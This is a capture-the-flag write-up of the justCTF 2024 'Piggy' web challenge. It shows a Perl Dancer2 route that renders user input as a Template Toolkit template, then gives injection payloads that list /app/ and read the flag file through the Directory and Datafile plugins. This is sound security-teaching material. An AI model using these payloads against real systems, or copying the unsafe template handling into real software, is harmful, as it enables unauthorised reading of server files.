# Piggy

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- Solved by: @siunam
- Contributor: @jose.fk
- 61 solves / 180 points
- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

Who is such a piggy (ツ)

_Many players ask about piggy being broken (missing flag.txt) but it works as intended._

- [http://piggy.web.jctf.pro](http://piggy.web.jctf.pro)
    
- https://s3.cdn.justctf.team/f2af71a7-f199-47a7-9934-013a168a76f7/piggy_docker.tar.gz

![](https://github.com/siunam321/CTF-Writeups/blob/main/justCTF-2024-teaser/images/Pasted%20image%2020240616160252.png)

## Enumeration

**Index page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/justCTF-2024-teaser/images/Pasted%20image%2020240616161132.png)

In here, it is just a welcome page, nothing special. Hmm... Let's read the source code of this web application!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/justCTF-2024-teaser/Web/Piggy/piggy_docker.tar.gz):**
```shell
┌[siunam♥Mercury]-(~/ctf/justCTF-2024-teaser/Web/Piggy)-[2024.06.16|16:15:43(HKT)]
└> file piggy_docker.tar.gz 
piggy_docker.tar.gz: gzip compressed data, from Unix, original size modulo 2^32 289280
┌[siunam♥Mercury]-(~/ctf/justCTF-2024-teaser/Web/Piggy)-[2024.06.16|16:15:45(HKT)]
└> tar xvzf ./piggy_docker.tar.gz 
./
./Dockerfile
./views/
./views/index.tt
./public/
./public/images/
./public/images/piggy.webp
./config.yml
./app.pl
./flag.txt
./docker-compose.yaml
```

After reviewing the source code, we have the following findings!

- The flag is *seemingly* at `/app/flag.txt` (The `COPY . .` Docker command from the `Dockerfile`)
- This web application is written in Perl's **[Dancer2](https://metacpan.org/pod/Dancer2)** web application framework
- This web application uses Perl's **[Template Toolkit](https://template-toolkit.org/)** to render templates

Let's dive into the web application main logic source code at `app.pl`!

First, at GET route `/`, it just render the template `views/index.tt` with a randomly chosen `greetings` string: 

```perl
[...]
use Dancer2;
use Template;

my @greetings = ("Hello", "Ebe", "Greetings", "Hi", "Good day");

get '/' => sub {
    my $greeting = $greetings[rand @greetings];
    template 'index' => {
        greeting => $greeting
    };
};
[...]
```

`views/index.tt`:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Piggy</title>
    <style>
        [...CSS stuff...]
    </style>
</head>
<body>
    <h1>[% greeting %]! Welcome to our app.</h1>
    <p>This is Piggy, your friendly task companion!</p>
    <img src="/images/piggy.webp" alt="Laughing Pig">
</body>
</html>
```

Hmm... Nothing weird and interesting for us in this route.

**However, there's a peculiar POST route at `/debug`:** 
```perl
[...]
post '/debug' => sub {
    my $input = body_parameters->get('debug');
    my $output;
    
    my $template = Template->new({
        INCLUDE_PATH => './views'
    });
    $template->process(\$input, {}, \$output) or die $template->error();
    return $output;
};
[...]
```

In this POST route, we can see that it takes a `debug` POST body parameter, and parses it with the `process` method to render our template literals!

With that said, this POST route is basically **SSTI (Server-Side Template Injection) in Perl's Template Toolkit** for free!

In Template Toolkit's [syntax documentation](https://template-toolkit.org/docs/manual/Syntax.html), the default tag markers are `[%` and `%]`.

**Let's try to let the server to render `49` with `[% 7*7 %]` at POST route `/debug`!**
```http
POST /debug HTTP/1.1
Host: 5al1vghdkve4bhweufft29r3nsvp22.piggy.web.jctf.pro
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

debug=[% 7*7 %]
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/justCTF-2024-teaser/images/Pasted%20image%2020240616163752.png)

Nice! It worked as expected!

Now, how can we read the flag file?

## Exploitation

After digging the [plugins documentation](https://template-toolkit.org/docs/manual/Plugins.html), there're some interesting plugins that are related to reading/listing the file system!

More specifically, plugin "**[Directory](https://template-toolkit.org/docs/manual/Plugins.html#section_Directory)**" and "**[Datafile](https://template-toolkit.org/docs/manual/Plugins.html#section_Datafile)**" can **list all the files** with a provided path and **read files**.

First, let's list all the files at path `/app/` with plugin **Directory**!

**In the [detailed documentation of the plugin Directory](https://template-toolkit.org/docs/modules/Template/Plugin/Directory.html), we can do that with this template syntax:**
```
[% USE dir = Directory('/app/') %]
[% FOREACH file = dir.files %]
    [% file.name %]
[% END %]
```

In this syntax, it lists all the filenames at path `/app/`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/justCTF-2024-teaser/images/Pasted%20image%2020240616165127.png)

Nice! We got the flag's filename. In my case, it's `flag_980aef6e461ca1009ea62da051753b38.txt`.

Then, we can read the flag's file via plugin **Datafile**!

By reading the [detailed documentation of the plugin Datafile](https://template-toolkit.org/docs/modules/Template/Plugin/Datafile.html), we can use this syntax the read the flag file:

```
[% USE flagContent = datafile('/app/flag_980aef6e461ca1009ea62da051753b38.txt') %]
[% FOREACH flag = flagContent %]
   [% flag %]
[% END %]
```

However, if we do that, it just outputs the hash reference to the flag file:

![](https://github.com/siunam321/CTF-Writeups/blob/main/justCTF-2024-teaser/images/Pasted%20image%2020240616165649.png)

In the documentation, it said:

> **The first line defines the field names**, **delimited by colons** with optional surrounding whitespace. Subsequent lines then defines records containing data items, also delimited by colons. [...]

Uhh... Can we set a delimiter character other than a colon (`:`) character?

Luckily, the plugin also allows us to **set the delimiter character via the `delim` parameter**:

```
[% USE things   = datafile('items', delim = '|') %]
```

Hmm... What character should we use for the delimiter character?

**In the local testing flag, we can see the flag file's content:**
```
Here is your fat flag:
justCTF{fake}
```

Ah ha! We can use space character as the delimiter character!

**Now, we should be able to read the flag's content via `flag.Here` using the space character for the delimiter character!**
```
[% USE flagContent = datafile('/app/flag_980aef6e461ca1009ea62da051753b38.txt', delim = ' ') %]
[% FOREACH flag = flagContent %]
   [% flag.Here %]
[% END %]
```

The reason why we use `Here` as the key is because this plugin uses **the first line to define the field names**, and **the delimeter in this case is a space character**. Hence, the first word for each line will be with the field name `Here`.

![](https://github.com/siunam321/CTF-Writeups/blob/main/justCTF-2024-teaser/images/Pasted%20image%2020240616170550.png)

- **Flag: `justCTF{0iNk_oinKxD}`**

## Conclusion

What we've learned:

1. Server-Side Template Injection (SSTI) in Perl "Template Toolkit"